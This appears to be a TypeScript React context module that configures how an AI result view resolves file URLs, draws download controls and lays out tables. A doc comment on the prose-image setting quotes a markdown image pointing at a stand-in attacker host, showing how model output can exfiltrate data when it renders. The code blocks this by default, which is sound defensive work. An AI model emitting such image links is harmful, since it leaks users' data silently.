'use client';

import { createContext, use, useCallback, useMemo, type ReactNode } from 'react';
import type { SaveFile, SaveFiles, SaveResult } from '../core/save-plan';
import type { StuffFileKind } from '../core/stuff-files';
import { absoluteUrl } from './absolute-url';
import { saveInBrowser } from './save-in-browser';

/**
 * The host's seam for turning a stored reference into something a browser can
 * fetch.
 *
 * ## Why a result view needs one at all
 *
 * A run's files do not come back as public URLs. They come back as
 * `pipelex-storage://…` references, which are an identity in the runtime's
 * store and resolve nowhere in a browser. Without a way to exchange them, every
 * file arm in the result view degrades to naming the file — a PDF that cannot
 * be previewed, an image gallery of blank tiles — and no amount of care in
 * those arms can fix it, because the missing thing is a fact only the host has.
 *
 * ## Why it is SYNCHRONOUS
 *
 * The obvious shape is `(uri) => Promise<string | null>`, and it is the wrong
 * one here. It would put a loading state, a race and an effect into every arm
 * that paints a file — inside table cells and gallery tiles, which are the
 * places least able to carry them — and a gallery of twenty images would make
 * twenty independent round trips as it scrolled.
 *
 * A host that resolves by REWRITING (the common case: map the reference onto
 * its own `/assets` route, which checks ownership and streams the object) has
 * no round trip to make and is served exactly by a pure function. A host that
 * genuinely must presign is better off resolving the run's references in one
 * batch — it holds the payload before it renders it — and closing over the
 * result, which is also the only shape that does not make a gallery quadratic.
 *
 * So the seam is a pure function, and the async case is a lookup in a map the
 * host filled. That is a real constraint on a host and it is stated rather than
 * hidden.
 *
 * ## The contract
 *
 * Return `undefined` for a reference this host cannot resolve, and the view
 * falls back to naming the file — which is what it does with no resolver at
 * all. Never return a URL that will 404: a broken image tile says less than a
 * filename.
 */
export type ResolveUrl = (url: string) => string | undefined;

/**
 * How a stored reference becomes a URL that works OUTSIDE this page — pasted
 * into another tab, another app, a colleague's message.
 *
 * Separate from `resolveUrl`, because the two answer different questions and a
 * host's answers genuinely differ. A display URL may be a path on the host's
 * own origin behind its session (`/api/assets/…`), which is what lets a strict
 * `img-src 'self'` policy stand and what keeps a picture from expiring while
 * the tab is open. That URL is useless on the clipboard: whoever pastes it has
 * no session. A share URL therefore carries its own credential — a freshly
 * minted presigned URL — and is minted per click rather than held, because it
 * starts expiring the moment it exists.
 *
 * Async for the same reason: minting one is a round trip. Omit it and the copy
 * control falls back to the display URL, which is right for a host whose
 * storage is public anyway.
 */
export type ResolveShareUrl = (url: string) => Promise<string | undefined>;

/**
 * What a `prose` value's markdown images do — and the default is not to load
 * them.
 *
 * A prose value is MODEL OUTPUT, and `![](https://attacker/collect?…)` in it is
 * a request the browser makes the moment the result is painted, before anyone
 * has read a word. Nothing was clicked and nothing was consented to, so the
 * exfiltration channel is open by default in a view whose whole content is
 * untrusted. `'link'` closes it: the image renders as a link carrying its alt
 * text, so nothing the model wrote is lost and the fetch waits for a click.
 *
 * `'load'` is the opt-in, for a host that knows where its prose images come
 * from — a method that composes a report out of its own stored figures, say.
 * Only `http:` and `https:` are ever painted or linked either way.
 */
export type ProseImages = 'link' | 'load';

/**
 * Which download controls a result view draws, each set on its own.
 *
 * Apps want different things here: one shows only the download of the whole
 * result, another only a download on each image, a third both, a fourth
 * neither because it saves results its own way. So the two are independent,
 * and the per-file one can be narrowed to the kinds of file that should carry
 * it.
 *
 * Set once on `ResultEnvProvider`, because a file's own button is drawn deep
 * inside the result (a gallery tile, a table row's detail, a nested record) and
 * has to follow the setting whether or not a `StuffViewer` wraps it.
 * `StuffViewer`'s own `downloads` prop overrides it, key by key, for that one
 * panel.
 *
 * Hiding a control never disables saving: a host with its own save UI still
 * plans with `planStuffSave` and delivers through its own function.
 */
export interface DownloadDisplay {
  /** The header control that saves the whole result. Drawn unless `false`. */
  result?: boolean;
  /**
   * Each file's own download button: on every file when `true` (the default),
   * on none when `false`, or only on the kinds listed — `'image'`,
   * `'document'`, and `'markup'` for an HTML page.
   */
  files?: boolean | readonly StuffFileKind[];
  /**
   * The "Download PDF" control on each HTML page, which makes a PDF of the
   * page in the browser and saves it. Drawn unless `false`.
   */
  pdf?: boolean;
  /**
   * Ask the reader for the file's name before each download, in a dialog
   * pre-filled with the name the plan chose. Off unless `true`.
   *
   * It is a behaviour of every download control rather than a control of its
   * own, which is why it sits beside the three that say which are drawn: the
   * PDF, the page's HTML, a file's own button, and the whole-result download.
   * A whole-result download saving one file asks for that file's name; one
   * saving several asks for the name they share, the base name, which names
   * the JSON copy and every file the payload did not name itself.
   */
  askFileName?: boolean;
}

interface ResultEnv {
  resolveUrl?: ResolveUrl;
  resolveShareUrl?: ResolveShareUrl;
  proseImages?: ProseImages;
  /**
   * How saved files reach the reader. Every download goes through it: the
   * whole-result control and each file's own button alike, each handing it the
   * files to save as a plan (a name, a media type, and the URL the gate
   * admitted or the inline text).
   *
   * Unset, files are saved by the browser tab (`saveInBrowser`), which fetches
   * each URL and saves the bytes through an object URL and a clicked link. A
   * host whose view runs in a sandboxed frame is refused all of that, and
   * supplies a function that asks the host to deliver the files instead —
   * passing the URLs on as links, since a host's download bridge fetches links
   * itself.
   *
   * It reports the files it could not deliver rather than throwing, so the
   * control can tell the reader which ones did not arrive.
   */
  saveFiles?: SaveFiles;
  /** Which download controls are drawn. Both, on every kind of file, when unset. */
  downloads?: DownloadDisplay;
  /**
   * How many data columns a table of records shows. Five when unset.
   *
   * A record with more fields than this keeps the columns a reader decides on —
   * its name first, then the values that fit a cell whole — and the rest move
   * into the row's detail, one click away. The columns shown keep the order the
   * method's author wrote them in. A record within the budget shows every field.
   *
   * It is a COUNT rather than a width the view measures, and that is the point:
   * a count renders the same table on a server, in a test and in a browser,
   * where a measured budget would change the table's shape after hydration, and
   * differently from one host to the next. A host that knows its panel is wide
   * raises it; `Infinity` shows every column. A value below one reads as one,
   * which is the record's name alone.
   */
  tableColumns?: number;
}

const ResultEnvContext = createContext<ResultEnv>({});

export function ResultEnvProvider({
  resolveUrl,
  resolveShareUrl,
  proseImages,
  tableColumns,
  saveFiles,
  downloads,
  children,
}: ResultEnv & { children: ReactNode }) {
  const env = useMemo(
    () => ({ resolveUrl, resolveShareUrl, proseImages, tableColumns, saveFiles, downloads }),
    [resolveUrl, resolveShareUrl, proseImages, tableColumns, saveFiles, downloads],
  );
  return <ResultEnvContext value={env}>{children}</ResultEnvContext>;
}

/**
 * The provider's download display with one panel's own settings laid over it,
 * key by key, for everything beneath. Internal: it is how `StuffViewer`'s
 * `downloads` prop reaches the file buttons drawn deep inside its tree.
 */
export function DownloadDisplayOverride({
  downloads,
  children,
}: {
  downloads: DownloadDisplay | undefined;
  children: ReactNode;
}) {
  const env = use(ResultEnvContext);
  const result = downloads?.result;
  const files = downloads?.files;
  const pdf = downloads?.pdf;
  const askFileName = downloads?.askFileName;
  const merged = useMemo(
    () =>
      result === undefined && files === undefined && pdf === undefined && askFileName === undefined
        ? env
        : {
            ...env,
            downloads: {
              result: result ?? env.downloads?.result,
              files: files ?? env.downloads?.files,
              pdf: pdf ?? env.downloads?.pdf,
              askFileName: askFileName ?? env.downloads?.askFileName,
            },
          },
    [env, result, files, pdf, askFileName],
  );
  return <ResultEnvContext value={merged}>{children}</ResultEnvContext>;
}

/**
 * The resolver, already applied.
 *
 * Every file arm calls this rather than reading the context and remembering to
 * apply it: `useResolvedUrl(url)` is the URL to actually use, and a component
 * that forgets to call it is the bug this shape prevents. An unresolvable
 * reference comes back as the reference, so the arms' own `viewableUrl` check
 * still decides whether it can be linked or only named — and, when it can, what
 * string they use.
 */
export function useResolvedUrl(url: string): string {
  return use(ResultEnvContext).resolveUrl?.(url) ?? url;
}

/** For the non-React readers that need the same answer (previewability). */
export function useResolveUrl(): ResolveUrl | undefined {
  return use(ResultEnvContext).resolveUrl;
}

/** The share-URL minter, when the host supplies one. */
export function useResolveShareUrl(): ResolveShareUrl | undefined {
  return use(ResultEnvContext).resolveShareUrl;
}

/**
 * How saved files reach the reader: the host's function, or the browser tab's,
 * wrapped so that every control asking can rely on the answer.
 *
 * - A root-relative URL is made absolute against this document before it is
 *   handed over, so a host delivering outside the view's frame reads
 *   `/api/assets/x` as the view did rather than against its own page.
 * - A delivery that throws, before returning a promise or by rejecting one,
 *   has delivered nothing it can vouch for, so every file is reported failed. A
 *   host function that is not `async` and throws on a missing bridge would
 *   otherwise leave the control that asked waiting for good, and say nothing.
 *   So has one that resolves to something with no `failed` list.
 */
export function useSaveFiles(): SaveFiles {
  const save = use(ResultEnvContext).saveFiles ?? saveInBrowser;
  return useCallback((files) => deliver(save, files), [save]);
}

async function deliver(save: SaveFiles, files: readonly SaveFile[]): Promise<SaveResult> {
  const handed = files.map((file) =>
    file.url === undefined ? file : { ...file, url: absoluteUrl(file.url) },
  );
  try {
    // Read as a host may actually answer: one typed loosely, a bridge that
    // resolves `any`, can hand back an object with no `failed` list. It cannot
    // vouch for anything then, and reading the list off it would throw inside
    // the control that asked, which for a file's button is a render error that
    // takes the whole view down.
    const result = (await save(handed)) as Partial<SaveResult> | undefined;
    if (Array.isArray(result?.failed)) return { failed: result.failed };
    return {
      failed: handed.map((file) => ({ file, reason: 'The save function reported no result' })),
    };
  } catch (error) {
    const reason = error instanceof Error ? error.message : String(error);
    return { failed: handed.map((file) => ({ file, reason })) };
  }
}

/** Whether the whole-result download control is drawn. */
export function useResultDownloadShown(): boolean {
  return use(ResultEnvContext).downloads?.result ?? true;
}

/** Whether a file of this kind carries its own download button. */
export function useFileDownloadShown(kind: StuffFileKind): boolean {
  const files = use(ResultEnvContext).downloads?.files ?? true;
  return typeof files === 'boolean' ? files : files.includes(kind);
}

/** Whether an HTML page carries its "Download PDF" control. */
export function usePdfSaveShown(): boolean {
  return use(ResultEnvContext).downloads?.pdf ?? true;
}

/** Whether a download asks the reader for the file's name first. */
export function useAskFileName(): boolean {
  return use(ResultEnvContext).downloads?.askFileName ?? false;
}

/** The prose-image policy, defaulted to the safe answer for a host that stated none. */
export function useProseImages(): ProseImages {
  return use(ResultEnvContext).proseImages ?? 'link';
}

/**
 * The column budget a table of records starts from when the host states none.
 *
 * Five columns of short values fit a method app's result panel once the name
 * has its floor: the name, and four values a reader compares down a column. See
 * `docs/result-view.md` for how the columns are chosen.
 */
const DEFAULT_TABLE_COLUMNS = 5;

/**
 * The column budget, normalised: the default when the host stated none (or a
 * `NaN`), a whole number otherwise, and never below one. `Infinity` passes
 * through, and is how a host shows every column.
 */
export function useTableColumns(): number {
  const budget = use(ResultEnvContext).tableColumns;
  if (budget === undefined || Number.isNaN(budget)) return DEFAULT_TABLE_COLUMNS;
  return Math.max(1, Math.floor(budget));
}
